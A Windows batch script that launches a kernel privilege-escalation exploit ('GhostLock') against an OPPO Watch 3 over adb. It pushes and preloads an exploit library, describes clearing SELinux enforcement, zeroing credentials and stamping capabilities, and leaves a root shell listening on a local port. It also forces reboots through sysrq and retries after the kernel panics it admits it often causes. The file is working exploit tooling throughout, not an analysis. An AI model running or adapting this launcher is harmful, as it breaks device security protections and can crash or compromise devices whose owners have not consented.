@echo off
rem ===========================================================================
rem  root.bat - one-shot automatic root for the OPPO Watch 3 (OWW212)
rem
rem  Fires the GhostLock UW program: inside ONE boot it hunts its own cred
rem  (init_task.tasks -> newest task -> its cred), clears selinux_state.enforcing,
rem  zeroes the uid/gid words, stamps the capability words, puts uts_ns back and
rem  leaves a rooted shell listening on the watch's 127.0.0.1:25555. This script
rem  then sets up `adb forward` and hands you that shell.
rem
rem    root.bat              fire + interactive root shell
rem    root.bat --cmd id     fire, run those commands, print the output
rem    root.bat --attach     only attach (a fire is already running)
rem    root.bat --check      test adb / device / python only, never fires
rem
rem  Nothing is flashed and the bootloader is never touched. Root lasts until the
rem  watch reboots. Roughly one fire in three panics the watch (the PI walk steps
rem  on the real rb tree), so this retries by itself, up to %RETRIES% times.
rem
rem  WHY EVERY TRY STARTS WITH A REBOOT (this is what the old version got wrong):
rem   1. one boot only lands the hunt ONCE. Re-firing on a boot that was already
rem      fired reads a tasks.prev that is no longer a live task (garbage comm, a
rem      cred like d5bb4520), the walk stalls, and the box panics ~15 s later.
rem   2. while the watch is rooted `adb reboot` is REFUSED: adbd's reboot service
rem      writes sys.powerctl, and init rejects it because our own selinux_state
rem      zeroing broke SID->context translation (getpeercon() failed). So the
rem      reboot must go through the root daemon and /proc/sysrq-trigger.
rem   3. boot_completed is far too early to fire: the watch has 840 MB RAM and
rem      settles with 16-35 MB free, load 4-41. It needs ~100 s of idling or the
rem      hunt loses the race.
rem ===========================================================================
setlocal enabledelayedexpansion
rem Self-locating: the repo works wherever you clone it. adb is taken from
rem C:\platform-tools first, then from PATH -- ignoring the 0-byte `adb` shim
rem that Git for Windows puts in front of the real adb.exe.
set DIR=%~dp0
set ADB=C:\platform-tools\adb.exe
if not exist "%ADB%" for /f "delims=" %%I in ('where adb.exe 2^>nul') do call :tryadb "%%~fI" %%~zI
if defined ADBFOUND set ADB=%ADBFOUND%
set SO=%DIR%exploit\preload.so
set DT=/data/local/tmp
set LOCK=%DT%/ghostlock.lock
set PORT=25555
set PY=python
set RETRIES=6
set SETTLE=100
set GL=%TEMP%\ghostlock-last-log.txt
set FIND=%SystemRoot%\System32\find.exe
set FS=%SystemRoot%\System32\findstr.exe
set ARGS=%*
set /a TRY=1

if not exist "%ADB%" ( echo [x] adb not found: %ADB% & exit /b 1 )
if not exist "%SO%"   ( echo [x] exploit not found: %SO% & exit /b 1 )
cd /d "%DIR%"

echo %ARGS%|"%FIND%" "--check" >nul && (
  echo [*] adb devices:
  "%ADB%" devices
  echo [*] python:
  %PY% --version
  echo [*] exploit artifact:
  dir "%SO%" | "%FIND%" "preload.so"
  echo [*] everything above looks usable - now run:  root.bat
  exit /b 0
)

echo [*] waiting for the device ...
"%ADB%" wait-for-device || ( echo [x] no device & exit /b 1 )

rem --attach must not reboot anything: a fire is already live and rooted.
echo %ARGS%|"%FIND%" "--attach" >nul && goto rooted

:attempt
echo.
echo [*] fire attempt !TRY! of %RETRIES%
call :freshboot || goto giveup
call :pushso    || goto giveup

rem Build the launcher ON THE DEVICE with printf: cmd's delayed expansion eats the
rem shebang '!' (that silently produced '#/system/bin/sh'), so the '!' is written
rem as its octal escape and $GFSO stays literal until the fire reads it.
"%ADB%" shell "printf '#\041/system/bin/sh\nexport LD_PRELOAD=$GFSO\nexec /system/bin/toybox true\n' > %DT%/fire3.sh; chmod 755 %DT%/fire3.sh" >nul 2>&1
"%ADB%" shell "rm -f %DT%/log_*.txt" >nul 2>&1

rem Detach ON THE DEVICE instead of on the host: `nohup sh -c '...' </dev/null &`
rem orphans the fire into init and this adb call returns at once, so NO host
rem process is left attached to this console. A `start /b adb shell` sibling keeps
rem reading the keyboard and silently swallows whatever the user types -- that is
rem what made the interactive shell look hung right after `id`. nohup also covers
rem the seconds before the exploit installs its own SIGHUP ignore, and
rem GHOSTLOCK_STAY=1 keeps the process alive afterwards (never kill it: tearing
rem down the fire's process group is what panics the watch).
"%ADB%" shell "nohup sh -c 'GFSO=%DT%/!GSN! GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh %DT%/fire3.sh' </dev/null >/dev/null 2>&1 &" >nul 2>&1

set /a W=0
:waitroot
ping -n 4 127.0.0.1 >nul
set /a W+=1
rem One adb call per poll (two is slower and each `adb shell` spawns a toybox
rem that competes with the hunt for the tail of the task list).
"%ADB%" shell "cat `ls -t %DT%/log_*.txt 2>/dev/null | head -1` 2>/dev/null" >"%GL%" 2>nul
"%FIND%" "UW-SHELL listening" "%GL%" >nul && goto rooted
"%FIND%" "SKIP single-flight" "%GL%" >nul && goto blocked
rem the fire prints root=NO when it runs out of attempts without rooting
"%FIND%" "root=NO" "%GL%" >nul && goto retry
if !W! equ 15 (
  for %%F in ("%GL%") do echo     ...fire is working, log is %%~zF bytes
)
if %W% lss 70 goto waitroot
echo [*] no verdict after !W! polls - the walk stalled (a panic usually follows)
goto retry

:blocked
echo [x] %LOCK% is held by an older fire that is still running. NEVER kill it:
echo     tearing down the fire's futex/PI threads reboots the watch. The reboot
echo     below clears the lock, so just let this script continue.
goto retry

:retry
set /a TRY+=1
if !TRY! gtr %RETRIES% goto giveup
goto attempt

:giveup
echo [x] no root after %RETRIES% fresh boots. Hold the side key ~15s to
echo     power-cycle, wait for Android, then run: root.bat
echo     Then read the fire log: adb shell "cat /data/local/tmp/log_*.txt"^| more
goto end

rem --------------------------------------------------------------------------
rem  :freshboot - put the watch into a boot that has never been fired, and let
rem  it go quiet.  Returns 1 if the watch never comes back.
rem --------------------------------------------------------------------------
:freshboot
echo [*] rebooting for a clean boot ...
rem Rooted? then use the daemon: sysrq works because we are uid 0 on
rem /proc/sysrq-trigger (--w--w---- root:system), where adb reboot does not.
%PY% rootcmd.py 12 "sync; sync; echo b > /proc/sysrq-trigger" >nul 2>&1
ping -n 6 127.0.0.1 >nul
"%ADB%" reboot >nul 2>&1
set /a D=0
:waitdown
ping -n 3 127.0.0.1 >nul
"%ADB%" shell "get-state" 2>nul | "%FIND%" "device" >nul
if errorlevel 1 goto down
set /a D+=1
if !D! lss 12 goto waitdown
echo [*] the watch never went down - it may already be rebooting, waiting anyway
:down
"%ADB%" wait-for-device >nul 2>&1
set /a T=0
:waitboot
"%ADB%" shell getprop sys.boot_completed 2>nul | "%FIND%" "1" >nul && goto settle
set /a T+=1
if !T! gtr 60 ( echo [x] boot timed out & exit /b 1 )
ping -n 4 127.0.0.1 >nul
goto waitboot
:settle
rem Do NOT fire in the watch's first minute: it sits at 5-11 MB free there and the
rem lowmemorykiller takes the fire out before it even reaches its plant phase -
rem the 16:43 attempt's log stops at "no-KASLR target" with no "UW start" at all.
set /a S=0
:waitup
"%ADB%" shell "uptime" 2>nul | "%FIND%" "up 0 min" >nul
if errorlevel 1 goto pastminute
set /a S+=1
if !S! gtr 20 ( echo [x] the watch never got past its first minute & exit /b 1 )
ping -n 16 127.0.0.1 >nul
goto waitup
:pastminute
echo [*] watch is past minute one, idling %SETTLE%s before firing
ping -n %SETTLE% 127.0.0.1 >nul
rem LOAD GATE, measured today: every fire that LANDED root went in at a 1-minute
rem load average of 9 or less (7.0, 6.9, 8.7, 9.4), and every fire that failed
rem went in at 10.3 or above (10.3, 10.7, 11.5, 12.0, 12.5, 12.8) -- at high load
rem the very first punch walks a busy PI chain and panics the watch before the
rem program has done anything at all. So wait for the box to quiet down.
set /a L=0
:waitload
"%ADB%" shell "uptime" 2>nul | "%FS%" /R "load average: [0-8]\." >nul && goto loadok
set /a L+=1
if !L! geq 18 goto loadok
echo     ...waiting for the 1-min load average to drop below 9
ping -n 11 127.0.0.1 >nul
goto waitload
:loadok
"%ADB%" shell "uptime; getenforce" 2>nul
exit /b 0

rem --------------------------------------------------------------------------
rem  :tryadb <path> <size> - accept a PATH-resolved adb only if it is a real
rem  binary (the Git-for-Windows `adb` shim is 0 bytes and breaks every call).
rem --------------------------------------------------------------------------
:tryadb
if %2 LSS 100000 exit /b 0
if defined ADBFOUND exit /b 0
set ADBFOUND=%~1
exit /b 0

rem --------------------------------------------------------------------------
rem  :pushso - a crash can poison the dentry of a name that was in use, so every
rem  attempt gets a brand new one (and push errors are checked, not swallowed).
rem --------------------------------------------------------------------------
:pushso
set /a N=%RANDOM% %% 900 + 100
:pushtry
set GSN=gs!N!.so
"%ADB%" push "%SO%" %DT%/!GSN! 2>&1 | "%FIND%" "pushed" >nul
if not errorlevel 1 (
  echo [*] pushed %DT%/!GSN!
  exit /b 0
)
set /a N+=1
if !N! lss 999 goto pushtry
echo [x] cannot push the exploit - try: root.bat --attach
exit /b 1

:rooted
rem --attach used to claim ROOT unconditionally, which lied on a watch that had
rem since rebooted: the daemon was gone and the shell just hung on a blank line.
"%ADB%" forward tcp:%PORT% tcp:%PORT% >nul 2>&1
set LIVE=0
"%PY%" rootcmd.py 12 "echo GHOSTLOCK_ROOT_HERE" 2>nul | "%FIND%" "GHOSTLOCK_ROOT_HERE" >nul && set LIVE=1
if not "!LIVE!"=="1" (
  echo [*] nothing is listening on %PORT% - this boot was never rooted ^(the watch
  echo     reboots itself when a rooted box loses the cable or adbd^), so firing
  echo     a fresh attempt instead of hanging on a dead shell.
  goto attempt
)
echo [ok] ROOT - SELinux is Permissive and a root shell listens on port %PORT%
echo [ok] any time later, without re-firing:  %PY% rootsh.py "id"
echo.
echo %ARGS%|"%FIND%" "--cmd" >nul && goto runcmds
rem The shell gets its OWN console window. In this window the fire's `adb shell`
rem client is still alive (it is what keeps the exploit process group up), and
rem two processes reading the same console keyboard means your typed command can
rem be swallowed by adb.exe instead of reaching the shell -- which is exactly how
rem "I typed id and nothing happened" looked.
echo --- root shell in THIS window (exit leaves the watch rooted until reboot) --
rem Safe to run inline now that no `start /b` adb client shares this keyboard.
%PY% rootsh.py
goto end
:runcmds
%PY% rootsh.py %ARGS:--cmd=%
:end
echo.
echo [*] done. While rooted: do NOT unplug the charger, do NOT kill or restart
echo     adbd - either one walks the leftover futex/PI state and reboots the box.
echo     Finish with: adb reboot   (or, if rooted: python rootcmd.py 25
echo     "sync; sync; echo b > /proc/sysrq-trigger")
endlocal
